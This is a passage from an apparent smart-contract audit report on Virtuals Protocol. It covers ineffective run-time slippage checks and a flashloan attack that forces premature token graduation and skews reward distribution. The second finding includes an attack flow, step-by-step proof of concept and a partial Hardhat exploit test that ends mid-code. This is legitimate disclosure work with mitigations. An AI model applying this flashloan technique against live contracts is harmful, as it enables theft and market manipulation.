<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/AgentTax.sol#L282-L283">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/AgentTax.sol#L282-L283</a></p>
<h3 style="position:relative;" id="finding-description-3"><a class="anchor before" aria-label="finding description 3 permalink" href="#finding-description-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>Automated Market Makers define the price of asset based on a pool of two assets. The ratio at which they exchange, is defined by a curve of constant product. Except when liquidity is proportionally increased for both, the expected behaviour is that as one increases, the other decreases.</p>
<p>In a pair of <code>token A</code> and <code>token B</code>, if a user deposits the first token, the amount he would receive of the second token is defined as the amount of the other token (<code>token B</code>) that we have to take away for their product to remain constant. Thus, every time a swap occurs, prices does even if slightly, change.</p>
<p>Sometimes before a transaction occurs, users could have also called (and executed) a swap before us, adversely affecting the price ratio (and if the liquidity of the pool is low, that might be even more noticeable). This is an adverse situation we call slippage. To protect against that, some protocols take a minimum amount out.</p>
<p>However, this protection only makes sense (as the risk it protects against) from outside the transaction in which it occurs. Because once the transaction is executing, unless we work with reentrant tokens or something akin to that, the price we are going to work with is the same one that is being used to calculate slippage protection.</p>
<p>Calculating a percentage of acceptable loss from a price fetched at the time of execution then is of no use, since that is already the price that we will be exposed to, be it acceptable or not.</p>
<p>In <code>BondingTax</code>, the <code>BondingTax::SwapForAsset</code> function looks like this:</p>
<pre data-index="40" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function swapForAsset() public onlyBondingRouter returns (bool, uint256) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 amount = IERC20(taxToken).balanceOf(address(this));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(amount &gt; 0, "Nothing to be swapped");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (amount &lt; minSwapThreshold) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            return (false, 0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (amount &gt; maxSwapThreshold) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            amount = maxSwapThreshold;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address[] memory path = new address[](2);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        path[0] = taxToken;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        path[1] = assetToken;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;        uint256[] memory amountsOut = router.getAmountsOut(amount, path); //@audit this gets whatever the price already is at execution</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(amountsOut.length &gt; 1, "Failed to fetch token price");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 expectedOutput = amountsOut[1]; //@audit no protection</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 minOutput = (expectedOutput * (10000 - _slippage)) / 10000; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        try router.swapExactTokensForTokens(amount, minOutput, path, treasury, block.timestamp + 300) returns (</span></span>
<span class="grvsc-line"><span class="grvsc-source">            uint256[] memory amounts</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            emit SwapExecuted(amount, amounts[1]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            return (true, amounts[1]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        } catch {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            emit SwapFailed(amount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            return (false, 0);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<p>Here we see that the output is calculated from the price the function fetches at execution time:</p>
<pre data-index="41" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">@&gt;        uint256[] memory amountsOut = router.getAmountsOut(amount, path); //@audit calculated from current price</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(amountsOut.length &gt; 1, "Failed to fetch token price");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 expectedOutput = amountsOut[1]; //@audit expected output is calculated from amountsOut</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 minOutput = (expectedOutput * (10000 - _slippage)) / 10000;</span></span></code></pre>
<p>This protection is insufficient. A similar implementation is tried in <code>AgentTax::dcaSell</code>:</p>
<pre data-index="42" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function dcaSell(uint256[] memory agentIds, uint256 slippage, uint256 maxOverride) public onlyRole(EXECUTOR_ROLE) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(slippage &lt;= DENOM, "Invalid slippage"); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 agentId;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        for (uint i = 0; i &lt; agentIds.length; i++) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            agentId = agentIds[i];</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">            TaxAmounts memory agentAmounts = agentTaxAmounts[agentId];</span></span>
<span class="grvsc-line"><span class="grvsc-source">            uint256 amountToSwap = agentAmounts.amountCollected - agentAmounts.amountSwapped;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">            if (amountToSwap &gt; maxOverride) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                amountToSwap = maxOverride; </span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;            uint256 minOutput = ((amountToSwap * (DENOM - slippage)) / DENOM);  //@audit slippage is received as a ratio here</span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;            _swapForAsset(agentId, minOutput, maxOverride);  //@audit a ratio over the price at execution</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<p>In both cases, the slippage protection is calculated at run-time. And that’s not a good enough protection against strong price or market movements occurring immediately before our call to uniswap is performed.</p>
<h3 style="position:relative;" id="impact-4"><a class="anchor before" aria-label="impact 4 permalink" href="#impact-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>The risk at which the protocol is exposed thus, is that price movements could lead to swap being executed at not acceptable prices brought by market dynamics, with no protection. The protocol might lose part of the funds that are meant to go to their treasure in the swap, or creators of <code>sentient</code> categorized agents might lose part of their trading fees earned.
Given that for now there is no public transaction pool in BASE, the severity might be deserving of medium.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-8"><a class="anchor before" aria-label="recommended mitigation steps 8 permalink" href="#recommended-mitigation-steps-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>I think there are more than one considerations to make here.</p>
<p>Given that the purpose of one of these functions <code>AgentTax::DcaSell</code> is executing many swaps in a loop, setting a single slippage protection inside the call could be not ideal, as the transactions run one after the other; and if the last one hits slippage, all of them get a revert (but could be chosen if that behaviour is desired).</p>
<p>Also, the other of the mentioned functions (<code>BondingTax::swapForAsset</code>) is meant to be called by another contract at execution (<code>FRouter::buy</code> and <code>FRouter::sell</code>, to handle fees), thus passing slippage protection parameters as an argument might be difficult.</p>
<p>Some solutions could be:</p>
<ul>
<li>
<p>For <code>AgentTax::DcaSell</code>, use a current starting price associated with a <code>TaxToken</code> at which execution of swap is acceptable to pass as an argument, and revert if it isn’t met.</p>
<ul>
<li>To get the current price at execution time, <code>IUniswapV2Router01::getAmountsOut</code> could be used, passing a reference value as amount, and then calculating the price from it and the value returned, to compare it with the argument and check slippage.</li>
</ul>
</li>
</ul>
<pre data-index="43" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);</span></span></code></pre>
<ul>
<li>
<p>For <code>BondingTax::swapForAsset</code>:</p>
<ul>
<li>If the calls inside <code>FRouter::buy</code> and <code>FRouter::sell</code> could be removed, the implementation could also be similar as that suggested for <code>AgentTax::DcaSell</code>. </li>
<li>Otherwise, you could set in the contract a minimum acceptable price (or a series of them, if you were to implement many <code>taxTokens</code>, for both contracts) in which you would consider more important to avoid the slippage lose than having the swap fail in the try-catch.</li>
</ul>
</li>
</ul>
<h3 style="position:relative;" id="proof-of-concept-6"><a class="anchor before" aria-label="proof of concept 6 permalink" href="#proof-of-concept-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li><code>BondingTax::SwapForAsset</code> is called by the bondingRouter, to swap a <code>taxToken</code> for the <code>AssetToken</code>.</li>
<li>Someone makes a very big swap exactly before the call in relevant pool.</li>
<li>The call executes.</li>
<li>We swapped fees cheaply.</li>
<li>After our swap the price gets a correction rather quickly to its average, but we already made the swap at a disadvantageous price.</li>
</ol>
<p>And in the other case:</p>
<ol>
<li><code>AgentTax::DcaSell</code> is called to process taxes.</li>
<li>Someone makes a very big swap exactly before the call in relevant pool.</li>
<li>Since slippage protection intends to be calculated at run-time, it never hits, even though the price could have dropped very significantly. So our call executes.</li>
<li>Swaps are performed successfully, and the protocol and the creators of agents would lose a significant part of their fees.</li>
</ol>
<hr>
<h2 style="position:relative;" id="m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation"><a class="anchor before" aria-label="m 04 launched tokens are vulnerable to flashloan attacks forcing premature graduation allowing reward manipulation permalink" href="#m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-12">[M-04] Launched tokens are vulnerable to flashloan attacks forcing premature graduation, allowing reward manipulation</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-246">oakcobalt</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-20">mbuba666</a></em></p>
<p>Bonding.sol only allows a launched memecoin to graduate when <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L350"><code>gradThreshold</code></a> is met and enough liquidity (<code>assetToken</code> balance) is gained through the investor community trading. This ensures the price stability of the <code>agentToken</code> upon graduation.</p>
<p>The vulnerability is that current implementation allows the investor community trading to be bypassed by flashloan attack. A malicious founder or founder controlled account can force graduate a token with a flashloan and gain exposure to reward emissions.</p>
<p>The key attack vector: <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L318"><code>buy()</code></a> memecoin with flashloaned virtual tokens (e.g. from already deployed uniswapV2pairs or other pools with virtual) → sell atomically in newly deployed uniswapV2pair. This forces graduation of a freshly deployed memecoin with no community support.</p>
<p>The key vulnerable code that enable the attack is <code>upwrapToken()</code> which allows converting memecoins to <code>agentTokens</code> do not have any time-based restrictions, allowing atomic unwrap upon graduation. A flashloan loop can be closed atomically through <code>unwrapToken</code>.</p>
<pre data-index="44" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">//contracts/fun/Bonding.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">unwrapToken</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">srcTokenAddress</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">accounts</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">Token</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">info</span><span class="mtk1"> = </span><span class="mtk12">tokenInfo</span><span class="mtk1">[</span><span class="mtk12">srcTokenAddress</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">info</span><span class="mtk1">.</span><span class="mtk12">tradingOnUniswap</span><span class="mtk1">, </span><span class="mtk8">"Token is not graduated yet"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">FERC20</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1"> = </span><span class="mtk11">FERC20</span><span class="mtk1">(</span><span class="mtk12">srcTokenAddress</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">IERC20</span><span class="mtk1"> </span><span class="mtk12">agentToken</span><span class="mtk1"> = </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">info</span><span class="mtk1">.</span><span class="mtk12">agentToken</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">pairAddress</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">getPair</span><span class="mtk1">(</span><span class="mtk12">srcTokenAddress</span><span class="mtk1">, </span><span class="mtk12">router</span><span class="mtk1">.</span><span class="mtk11">assetToken</span><span class="mtk1">());</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">accounts</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">acc</span><span class="mtk1"> = </span><span class="mtk12">accounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">balance</span><span class="mtk1"> = </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">acc</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">balance</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">burnFrom</span><span class="mtk1">(</span><span class="mtk12">acc</span><span class="mtk1">, </span><span class="mtk12">balance</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">|&gt;              </span><span class="mtk12">agentToken</span><span class="mtk1">.</span><span class="mtk11">transferFrom</span><span class="mtk1">(</span><span class="mtk12">pairAddress</span><span class="mtk1">, </span><span class="mtk12">acc</span><span class="mtk1">, </span><span class="mtk12">balance</span><span class="mtk1">);</span><span class="mtk3">//@audit no time restrictions, unwrapToken allows atomic agentToken conversion upon graduation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L416-L417">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L416-L417</a></p>
<pre data-index="45" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">Flows: flashswap/flashloan -&gt; bonding::buy -&gt; bonding::unwrapToken -&gt; uniswapV2router::swapExactTokensForETHSupportingFeeOnTransferTokens -&gt; paypack flashswap/flashloan</span></span></code></pre>
<h3 style="position:relative;" id="impact-5"><a class="anchor before" aria-label="impact 5 permalink" href="#impact-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ol>
<li><strong>Premature graduation:</strong> allowing easy price manipulation through flashloan that bypass community support and liquidity. </li>
<li><strong>Reward distribution is manipulated:</strong> forced graduated token will have Lp values (<a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/AgentRewardV3.sol#L110"><code>getLPValue()</code></a>) and eligible for reward shares, reducing other legitimate <code>agentToken</code> rewards. Malicious founder gains rewards and dilute other <code>agentToken</code>’s rewards.</li>
<li><strong>Market manipulation:</strong> the deployed uniswapV2pair through flash loan attack doesn’t have intended liquidity and agent token price stability because uniswapV2pair has unbalanced reserves.</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-9"><a class="anchor before" aria-label="recommended mitigation steps 9 permalink" href="#recommended-mitigation-steps-9"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Consider enforcing a delay in <code>upwrapToken</code> such that flash loan cannot be closed atomically.</p>
<h3 style="position:relative;" id="proof-of-concept-7"><a class="anchor before" aria-label="proof of concept 7 permalink" href="#proof-of-concept-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>Suppose founder launched Cat memcoin from bonding.sol. Attacker can be a founder or a founder controlled account.</p>
<ol>
<li>Attacker takes out flashloan (virtual token).</li>
<li>Attacker uses flashloan to buy memecoin and trigger graduation.</li>
<li>Unwrap tokens to receive agent tokens.</li>
<li>Trade agent tokens for virtual tokens in Uniswap pair atomically.</li>
<li>Attacker paying back flashloan with traded out virtual tokens (only paying extra fees/tax in trading).</li>
<li>Check that the uniswap LP tokens are automatically staked in veToken.</li>
<li>Delegate to self to be eligible for rewards.</li>
<li>Distribute rewards and verify forced graduated agent token receives allocation.</li>
</ol>
<p>See added unit test <code>flash loan attack force premature graduation</code>, manipulating rewards in <code>test/bonding.js</code>:</p>
<details>
<pre data-index="46" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  it.only("flash loan attack force premature graduation, stealing rewards", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    this.timeout(120000); // 120 seconds</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Setup test environment</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { virtualToken, bonding, fRouter, agentFactory, agentNft } =</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await loadFixture(deployBaseContracts);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { founder, trader, treasury, deployer } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Initial setup - founder launches a memecoin</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.mint(founder.address, parseEther("200"));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .approve(bonding.target, parseEther("1000"));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Launch the token</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await bonding</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .connect(founder)</span></span>
<span class="grvsc-line"><span class="grvsc-source">      .launchFor(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        "Cat",</span></span>
<span class="grvsc-line"><span class="grvsc-source">        "$CAT",</span></span>
<span class="grvsc-line"><span class="grvsc-source">        [0, 1, 2],</span></span>
<span class="grvsc-line"><span class="grvsc-source">        "cat memecoin",</span></span>
<span class="grvsc-line"><span class="grvsc-source">        "",</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ["", "", "", ""],</span></span>
<span class="grvsc-line"><span class="grvsc-source">        parseEther("200"),</span></span>
<span class="grvsc-line"><span class="grvsc-source">        founder.address</span></span>
<span class="grvsc-line"><span class="grvsc-source">      );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tokenInfo = await bonding.tokenInfo(await bonding.tokenInfos(0));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Token created:", tokenInfo.token);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 1: Attacker takes out flashloan (virtual token)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Use direct mint to mock flashloan interaction</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const flashLoanAmount = parseEther("100000");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.mint(trader.address, flashLoanAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "Flash loan acquired:",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      formatEther(flashLoanAmount),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "VIRTUAL"</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Step 2: Attacker uses flashloan to buy memecoin and trigger graduation</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.connect(trader).approve(fRouter.target, flashLoanAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Record token balances before attack</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const initialBalances = {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      traderVirtualBefore: await virtualToken.balanceOf(trader.address),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      pairVirtualBefore: await virtualToken.balanceOf(tokenInfo.pair),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      founderCatBefore: await ethers</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .getContractAt("IERC20", tokenInfo.token)</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .then((token) =&gt; token.balanceOf(founder.address)),</span></span>
<span class="grvsc-line"><span class="grvsc-source">    };</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Initial balances:");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "- Trader VIRTUAL:",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      formatEther(initialBalances.traderVirtualBefore)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "- Pair VIRTUAL:",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      formatEther(initialBalances.pairVirtualBefore)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
